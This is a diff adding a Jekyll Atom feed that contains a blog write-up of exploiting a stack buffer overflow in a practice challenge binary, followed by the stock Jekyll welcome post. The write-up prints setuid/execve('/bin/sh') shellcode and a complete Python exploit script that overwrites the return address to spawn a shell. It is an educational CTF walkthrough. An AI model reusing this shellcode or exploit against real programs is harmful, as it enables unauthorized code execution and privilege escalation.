@@ -1,0 +1,160 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/blog/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/blog/" rel="alternate" type="text/html" /><updated>2023-11-19T18:47:44+02:00</updated><id>http://localhost:4000/blog/feed.xml</id><title type="html">Hacking a simple binary</title><subtitle>Welcome to my personal blog. I talk reverse-engineering, exploit development and all things malware development here. </subtitle><entry><title type="html">Hacking a simple binary</title><link href="http://localhost:4000/blog/binary-exploitation/exploit-development/2023/11/19/BinExpCTF1.html" rel="alternate" type="text/html" title="Hacking a simple binary" /><published>2023-11-19T16:27:00+02:00</published><updated>2023-11-19T16:27:00+02:00</updated><id>http://localhost:4000/blog/binary-exploitation/exploit-development/2023/11/19/BinExpCTF1</id><content type="html" xml:base="http://localhost:4000/blog/binary-exploitation/exploit-development/2023/11/19/BinExpCTF1.html">&lt;h1 id=&quot;initial-setup-and-enumeration&quot;&gt;Initial setup and enumeration&lt;/h1&gt;
+&lt;p&gt;After downloading the &lt;strong&gt;challenge_1&lt;/strong&gt; executable and modifying the file permissions, I ran the program to see what it does.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://0x0l0rd.github.io/blog/assets/img/BE1/enumeration/0.png&quot; alt=&quot;Checking for binary defenses with file.&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://0x0l0rd.github.io/blog/assets/img/BE1/enumeration/1.png&quot; alt=&quot;Running the program.&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The program offers three options:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Creating a note.&lt;/li&gt;
+  &lt;li&gt;Reading all the created notes.&lt;/li&gt;
+  &lt;li&gt;Exiting the program.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://0x0l0rd.github.io/blog/assets/img/BE1/enumeration/3.png&quot; alt=&quot;Testing functionality in target program.&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I proceeded to check for low-hanging fruit; Format string bugs, Buffer Overflows (BoF), etc.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://0x0l0rd.github.io/blog/assets/img/BE1/enumeration/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://0x0l0rd.github.io/blog/assets/img/BE1/enumeration/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The program seemed to be susceptible to BoF. Next, I proceeded to examine what binary exploit mitigations were in place.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://0x0l0rd.github.io/blog/assets/img/BE1/enumeration/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I noted that there was no stack canary, the stack was executable, and no Position Independent Code. This may aid my exploitation attempts at a later stage. Moreover, I decided to leave ASLR enabled on my machine to challenge myself further.&lt;/p&gt;
+
+&lt;h1 id=&quot;reversing&quot;&gt;Reversing&lt;/h1&gt;
+&lt;p&gt;To conduct further investigation, I opened the executable in GDB and Ghidra. On inspection of GDB output, I found that the executable was not compiled with symbols.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://0x0l0rd.github.io/blog/assets/img/BE1/reversing/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So, I started from the top, &lt;strong&gt;libc_start_main&lt;/strong&gt;. Specifically, as the first parameter of the function is usually the main function, I concluded that it was the best place to start, considering that the binary didn’t seem very large.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://0x0l0rd.github.io/blog/assets/img/BE1/reversing/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;From there, it was relatively easy to determine the function which would be called whenever a note was created. Upon inspection of the function in question, the cause of the vulnerability was made clear.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://0x0l0rd.github.io/blog/assets/img/BE1/reversing/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;That is, the use of &lt;strong&gt;scanf()&lt;/strong&gt;, an unsafe function. As it does no bounds-checking, the bounds of the 206-byte buffer could be written past. Using the payload from before, and a breakpoint on the address of the ret instruction, I was able to confirm that the top of the stack before returning from the function was 0x41 (A).&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://0x0l0rd.github.io/blog/assets/img/BE1/reversing/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Using the following payload, I was able to confirm that I could control the saved return address: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python3 -c “print('1\n')+('A'*216)+('C'*8))” &amp;gt; ./test&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://0x0l0rd.github.io/blog/assets/img/BE1/reversing/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;(I previously ran the executable with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r &amp;lt; test&lt;/code&gt;, so restarting the program in GDB invoked the same piped input in the above screenshot.)
+I used 216 A’s in the payload, as it would take 208 bytes to fill every byte of the buffer, and a further 8 to overwrite the saved base pointer.&lt;/p&gt;
+
+&lt;h1 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h1&gt;
+&lt;p&gt;As the program was being run on a system with ASLR enabled, the simple stack-based buffer overflow would not work. This meant I would need to use a ROP chain. My first few attempts involved using Ropper to find gadgets in the Libc shared object library, but that did not work as a result of ASLR. The only addresses that did not seem to change with each new instance of the running program were the addresses of the gadgets found at the offsets of the code contained within the &lt;strong&gt;Challenge_1&lt;/strong&gt; binary.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://0x0l0rd.github.io/blog/assets/img/BE1/exploitation/2.png&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;I thought to use the gadget as shown in the above screenshot for a ret2libc-style exploit, but that did not work, as the address of &lt;strong&gt;system()&lt;/strong&gt; would change with each instance of the application being launched.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://0x0l0rd.github.io/blog/assets/img/BE1/exploitation/3.png&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Then I had the thought to use a gadget that would essentially pop RSP’s value into RIP, such that if I were to place shellcode on the stack, I could execute it by redirecting RIP to it.
+There were some gadgets I considered chaining together to achieve this, such as the following;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://0x0l0rd.github.io/blog/assets/img/BE1/exploitation/8.png&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://0x0l0rd.github.io/blog/assets/img/BE1/exploitation/7.png&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://0x0l0rd.github.io/blog/assets/img/BE1/exploitation/6.png&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;However, after stepping away for a bit, I found a simple solution which only required a single gadget. I discovered this attack vector by investigating the rest of the code contained within the function.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://0x0l0rd.github.io/blog/assets/img/BE1/exploitation/91.png&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;The contents of the buffer are copied to the address stored at the address stored in RDI (I.e, the first parameter passed to the function). This is likely some variable in the caller function, but I noted that I could use it, nonetheless. In addition, RAX is used as the base register for the copy operation. That would work well with the following gadget I found when using Ropper on the &lt;strong&gt;Challenge_1&lt;/strong&gt; binary:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://0x0l0rd.github.io/blog/assets/img/BE1/exploitation/94.png&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;I encountered some sort of error when using 0x40110c as the returned address with which I would overwrite the saved return address on the stack. For some reason, the address overwrite would not change the value of the saved address overwrite. However, by changing the last byte of the address, the overwrite would proceed as expected. I managed to solve the problem by altering the gadget address, such that the address used would be of the prior instruction, such that the last byte is anything other than 0x0c.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://0x0l0rd.github.io/blog/assets/img/BE1/exploitation/95.png&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;As the prior instruction was benign in relation to the intention, it would work (I.e because EDI’s value is not crucial to the exploit succeeding, its value being altered would not present any unexpected behavior).
+With the attack vector mapped out, I decided to write some shellcode, as it was the only piece of the exploit that was absent.
+The result was the following:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;section .data 
+section .bss
+section .text
+
+global _start
+
+_start:
+    jmp shellString
+pwn:
+    ; setuid(0) - GG if setuid :)
+    xor rax, rax
+    xor rdi, rdi
+    mov al, 0x69
+    syscall
+
+    ; execve(&quot;/bin/sh&quot;, 0x0, 0x0)
+    xor rax, rax
+    xor rdx, rdx
+    xor rsi, rsi
+    xor rcx, rcx
+    mov al, 0x3B
+    pop rdi
+    mov rdi, [rdi]
+    push rdi
+    push rsp
+    pop rdi
+    mov BYTE [rdi + 7], cl
+    syscall
+
+shellString:
+    call pwn
+    sh dq &quot;/bin/sh&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Finally, the resultant exploit code was as follows:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from struct import pack
+from os import system
+
+shellcode = b&quot;\xeb\x24\x48\x31\xc0\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xc0\x48\x31&quot;
+shellcode += b&quot;\xd2\x48\x31\xf6\x48\x31\xc9\xb0\x3b\x5f\x48\x8b\x3f\x57\x54\x5f\x88&quot;
+shellcode += b&quot;\x4f\x07\x0f\x05\xe8\xd7\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68&quot;
+
+return_addr = pack( &quot;&amp;lt;L&quot;, 0x401107 )
+
+target = &quot;./challenge_1&quot;
+payload = ( b'1\n' ) + shellcode + ( b'A' * 166 ) + return_addr
+
+
+def main():
+    with open( &quot;payload&quot;, &quot;wb+&quot; ) as f:
+        f.write( payload )
+
+    system( f&quot;(cat payload; printf '\n' ;cat) | {target}&quot; )
+
+if __name__ == &quot;__main__&quot;:
+    main()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;When run, I observed that the exploit worked as intended, and I successfully managed to get a shell!&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://0x0l0rd.github.io/blog/assets/img/BE1/exploitation/97.png&quot;&gt;&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><category term="Binary-Exploitation" /><category term="Exploit-Development" /><summary type="html">Initial setup and enumeration After downloading the challenge_1 executable and modifying the file permissions, I ran the program to see what it does.</summary></entry><entry><title type="html">Welcome to Jekyll!</title><link href="http://localhost:4000/blog/jekyll/update/2023/11/19/welcome-to-jekyll.html" rel="alternate" type="text/html" title="Welcome to Jekyll!" /><published>2023-11-19T15:48:31+02:00</published><updated>2023-11-19T15:48:31+02:00</updated><id>http://localhost:4000/blog/jekyll/update/2023/11/19/welcome-to-jekyll</id><content type="html" xml:base="http://localhost:4000/blog/jekyll/update/2023/11/19/welcome-to-jekyll.html">&lt;p&gt;You’ll find this post in your &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jekyll serve&lt;/code&gt;, which launches a web server and auto-regenerates your site when a file is updated.&lt;/p&gt;
+
+&lt;p&gt;To add new posts, simply add a file in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory that follows the convention &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;YYYY-MM-DD-name-of-post.ext&lt;/code&gt; and includes the necessary front matter. Take a look at the source for this post to get an idea about how it works.&lt;/p&gt;
+
+&lt;p&gt;Jekyll also offers powerful support for code snippets:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Hi, &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Tom'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#=&amp;gt; prints 'Hi, Tom' to STDOUT.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Check out the &lt;a href=&quot;https://jekyllrb.com/docs/home&quot;&gt;Jekyll docs&lt;/a&gt; for more info on how to get the most out of Jekyll. File all bugs/feature requests at &lt;a href=&quot;https://github.com/jekyll/jekyll&quot;&gt;Jekyll’s GitHub repo&lt;/a&gt;. If you have questions, you can ask them on &lt;a href=&quot;https://talk.jekyllrb.com/&quot;&gt;Jekyll Talk&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><category term="jekyll" /><category term="update" /><summary type="html">You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.</summary></entry></feed>
